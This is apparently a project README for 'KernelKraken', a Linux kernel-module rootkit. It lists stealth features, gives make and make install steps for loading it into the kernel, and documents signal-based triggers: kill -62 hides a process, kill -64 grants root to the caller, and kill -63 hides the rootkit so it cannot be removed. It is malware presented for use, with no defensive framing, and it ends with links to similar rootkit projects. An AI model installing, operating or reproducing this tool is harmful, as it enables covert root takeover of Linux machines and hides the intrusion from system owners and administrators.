# KernelKraken
<img align="center" src="https://github.com/infernexio/KernelKraken/blob/main/images/Kraken.png" height="370" width="450">

## Overview
*KernelKraken* is a Linux Kernel Module (LKM) Rootkit that works with with all linux kernel versions. Current features are:</br>

* File hiding
* Directory hiding
* Process hiding
* Logged in user hiding
* Open ports hiding
* Local privilege escalation
* Anti-detection

## Installation
run the make file with 
```
make
```
then you can run the command
```
make install
```
to install the module into the kernel

## Usage

### Hiding Files, Directories, Open ports and Logged in users
The rootkit automatically hides files, direcoties, open ports and logged in users. All of the settings are located in [`hooks.h`](https://github.com/infernexio/KernelKraken/blob/main/headers/hooks.h)

### Process hiding
```
kill -62 [ PID of process ]
```
The Process id given will be hidden from view

### Local privilege escalation
```
kill -64 [any PID]
```
The user that executed the above command will have root prileges.

### Anti-detection
```
kill -63 [any PID]
```
The rootkit will hide itself if visible or reveal itself if hidden. When hidden the rootkit is not removable.


## Resources/References:
	https://xcellerator.github.io
	https://github.com/xcellerator/linux_kernel_hacking
	https://github.com/mav8557/Father
  https://github.com/Nerelod/muadDib
  https://github.com/yonmo/popcorn
